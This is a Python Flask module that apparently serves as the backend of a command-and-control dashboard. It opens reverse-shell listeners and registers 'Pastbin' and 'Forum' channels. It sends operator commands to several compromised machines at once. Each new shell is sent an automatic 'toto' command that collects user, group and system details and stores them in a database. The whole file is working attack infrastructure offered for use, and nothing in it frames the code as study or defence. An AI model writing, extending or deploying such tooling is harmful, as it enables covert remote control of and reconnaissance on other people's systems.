from flask import request, jsonify, Blueprint, g
import jwt
import json
import threading
from app.db_schema import ensure_dashboard_tables
from app.jwt_handler import verify_token, token_required
from .shell import Shell, Pastbin, Forum
from DB import get_db_connection


terminal = Blueprint('dashboard', __name__)
listener= Blueprint('listener', __name__)
shells_list_bp = Blueprint('shells_list', __name__)
supprimer_shell_bp = Blueprint('supprimer_shell', __name__)
machine_info_bp = Blueprint('machine_info', __name__)

instances = {}
shell_temp = {}
TOTO_PREFIX = "__TOTO__"

@terminal.route('/terminal', methods=['GET', 'POST'])
@token_required
def terminal_command():
    ensure_dashboard_tables()

    data = request.get_json()

    command = data['commande']
    shell_user = data['shell']
    results = {}
    user_id = g.user_data["user_id"]

    # on boucle sur l'ensemble des shell ou l'on veux executer la commade
    for shell_temp in shell_user:
        shell_instance = instances[shell_temp]
        if command.strip().lower() == "toto":
            display_output = execute_toto_and_store(user_id, shell_temp)
        else:
            try:
                raw_output = shell_instance.execute(command)
            except Exception as e:
                raw_output = f"Erreur: {str(e)}"

            display_output = raw_output
            save_shell_command_log(user_id, shell_temp, command, display_output)

        # Transforme les sauts de ligne en <br> pour un affichage HTML correct
        output = display_output.replace('\n', '<br>')

        results[shell_temp] = output

    return jsonify({"resulat": results})


@listener.route('/listener', methods=['POST'])
@token_required
def listener_command():
    ensure_dashboard_tables()

    data = request.get_json()
    print(data)
    nom = data['nom']
    ip = data['host']
    port = data['port']
    types = data['type']
    user = data['user']
    password = data['password']
    print(types)

    user_info = g.user_data  # Données décodées du token
    user_id = user_info["user_id"]
    if types == "reverse shell":
        shell_temp[nom] = Shell(port)
        print("nom :", nom)
        if shell_temp[nom].listen():
            instances[nom] = shell_temp[nom]
            del shell_temp[nom]

            save_shell_to_db(user_id, nom, "shell")
            schedule_auto_toto_collection(user_id, nom)

        else:
            print("erreur de connexion")


        return jsonify({"resulat": "sa fcontion"})

    elif types == "Pastbin":
        instances[nom] = Pastbin(nom)
        save_shell_to_db(user_id, nom, "Pastbin")
        print("nom :", nom)

        return jsonify({"resulat": "sa fcontion"})

    elif types == "forume":
        instances[nom] = Forum(ip, port, user, password, nom)
        save_shell_to_db(user_id, nom, "Forum")
        schedule_auto_toto_collection(user_id, nom, timeout_seconds=20)
        print("nom :", nom)

        return jsonify({"resulat": "sa fcontion"})

    else:
        pass
    print("erreur")
    return jsonify({"resulat": "erreur"})


@shells_list_bp.route('/shells_list', methods=['GET', 'POST'])
@token_required
def shells_list():
    ensure_dashboard_tables()

    shells = []
    user_data = g.user_data
    user_id = user_data["user_id"]

    conn = get_db_connection()
    cursor = conn.cursor()

    cursor.execute("""SELECT * FROM shell WHERE id_proprietaire = %s""", (user_id,))

    rows = cursor.fetchall()
    for i in rows:
        shells.append(i)

    print(shells)

    conn.close()
    return jsonify(shells)


@machine_info_bp.route('/machine_info', methods=['GET'])
@token_required
def machine_info_list():
    ensure_dashboard_tables()

    user_id = g.user_data["user_id"]

    conn = get_db_connection()
    cursor = conn.cursor()

    try:
        cursor.execute(
            """
            SELECT
                s.id AS shell_id,
                s.nom AS shell_name,
                s.type_shell,
                smi.id_output,
                smi.groups_output,
                smi.users_output,
                smi.uname_output,
                smi.created_at,
                smi.updated_at
            FROM shell s
            LEFT JOIN shell_machine_info smi ON smi.shell_id = s.id
            WHERE s.id_proprietaire = %s
            ORDER BY s.nom ASC, s.id ASC
            """,
            (user_id,),
        )
        rows = cursor.fetchall()
    finally:
        conn.close()

    serialized = []
    for row in rows:
        item = dict(row)
        for key in ("created_at", "updated_at"):
            if item.get(key) is not None:
                item[key] = item[key].isoformat()
        serialized.append(item)

    return jsonify(serialized)


@supprimer_shell_bp.route('/supprimer_shell', methods=['POST'])
@token_required
def supprimer_shell():
    ensure_dashboard_tables()

    data = request.get_json()
    id = data["id"]

    user_data = g.user_data
    user_id = user_data["user_id"]


    conn = get_db_connection()
    cursor = conn.cursor()

    cursor.execute("""SELECT * FROM shell WHERE id = %s and id_proprietaire = %s""", (id, user_id,))

    rows = cursor.fetchone()
    if rows is not None:

        id_shell = rows["id"]
        id_proprietaire = rows["id_proprietaire"]
        nom = rows["nom"]
        if id_proprietaire == user_id:
            cursor.execute("""DELETE FROM shell WHERE id = %s""", (id_shell,))
            conn.commit()
            print("supprimer ", nom, " de la DB")
        else:
            print("erreur, pas le proprietaire")


    conn.close()

    return jsonify({"resulat": "supprimer"})


def save_shell_to_db(user_id, nom, shell_type):
    ensure_dashboard_tables()

    conn = get_db_connection()
    cursor = conn.cursor()

    cursor.execute("""
                   INSERT INTO shell (id_proprietaire, nom, type_shell)
                   VALUES (%s, %s, %s)
                   """, (user_id, nom, shell_type))

    conn.commit()
    conn.close()


def save_shell_command_log(user_id, shell_name, command, output):
    conn = get_db_connection()
    cursor = conn.cursor()

    try:
        cursor.execute(
            """
            SELECT id
            FROM shell
            WHERE id_proprietaire = %s AND nom = %s
            ORDER BY id DESC
            LIMIT 1
            """,
            (user_id, shell_name),
        )
        row = cursor.fetchone()
        if row is None:
            return

        cursor.execute(
            """
            INSERT INTO shell_command_log (shell_id, id_proprietaire, commande, sortie)
            VALUES (%s, %s, %s, %s)
            """,
            (row["id"], user_id, command, output),
        )
        conn.commit()
    finally:
        conn.close()


def schedule_auto_toto_collection(user_id, shell_name, timeout_seconds=None):
    worker = threading.Thread(
        target=execute_toto_and_store,
        args=(user_id, shell_name, timeout_seconds, True),
        daemon=True,
    )
    worker.start()


def execute_toto_and_store(user_id, shell_name, timeout_seconds=None, is_auto=False):
    shell_instance = instances.get(shell_name)
    if shell_instance is None:
        return "Erreur: shell introuvable"

    try:
        raw_output = shell_instance.execute("toto", timeout_seconds=timeout_seconds)
    except TypeError:
        raw_output = shell_instance.execute("toto")
    except Exception as e:
        raw_output = f"Erreur: {str(e)}"

    display_output = raw_output
    machine_info = parse_toto_output(raw_output)
    if machine_info is not None:
        save_shell_machine_info(user_id, shell_name, machine_info, raw_output)
        display_output = format_toto_summary(machine_info)

    save_shell_command_log(user_id, shell_name, "toto_auto" if is_auto else "toto", display_output)
    return display_output


def get_shell_id(user_id, shell_name):
    conn = get_db_connection()
    cursor = conn.cursor()

    try:
        cursor.execute(
            """
            SELECT id
            FROM shell
            WHERE id_proprietaire = %s AND nom = %s
            ORDER BY id DESC
            LIMIT 1
            """,
            (user_id, shell_name),
        )
        row = cursor.fetchone()
        if row is None:
            return None
        return row["id"]
    finally:
        conn.close()


def parse_toto_output(raw_output):
    if not isinstance(raw_output, str):
        return None

    payload = raw_output.strip()
    if not payload.startswith(TOTO_PREFIX):
        return None

    try:
        data = json.loads(payload[len(TOTO_PREFIX):])
    except json.JSONDecodeError:
        return None

    required_keys = ("id", "groups", "users", "uname")
    if any(key not in data for key in required_keys):
        return None

    return {
        "id_output": str(data.get("id", "")).strip(),
        "groups_output": str(data.get("groups", "")).strip(),
        "users_output": str(data.get("users", "")).strip(),
        "uname_output": str(data.get("uname", "")).strip(),
    }


def format_toto_summary(machine_info):
    return "\n".join(
        (
            "[toto] collecte machine",
            f"id: {machine_info['id_output']}",
            f"groups: {machine_info['groups_output']}",
            f"users: {machine_info['users_output']}",
            f"uname: {machine_info['uname_output']}",
        )
    )


def save_shell_machine_info(user_id, shell_name, machine_info, raw_payload):
    shell_id = get_shell_id(user_id, shell_name)
    if shell_id is None:
        return

    conn = get_db_connection()
    cursor = conn.cursor()

    try:
        cursor.execute(
            """
            INSERT INTO shell_machine_info (
                shell_id,
                id_proprietaire,
                id_output,
                groups_output,
                users_output,
                uname_output,
                raw_payload
            )
            VALUES (%s, %s, %s, %s, %s, %s, %s)
            ON DUPLICATE KEY UPDATE
                id_output = VALUES(id_output),
                groups_output = VALUES(groups_output),
                users_output = VALUES(users_output),
                uname_output = VALUES(uname_output),
                raw_payload = VALUES(raw_payload),
                updated_at = CURRENT_TIMESTAMP
            """,
            (
                shell_id,
                user_id,
                machine_info["id_output"],
                machine_info["groups_output"],
                machine_info["users_output"],
                machine_info["uname_output"],
                raw_payload,
            ),
        )
        conn.commit()
    finally:
        conn.close()
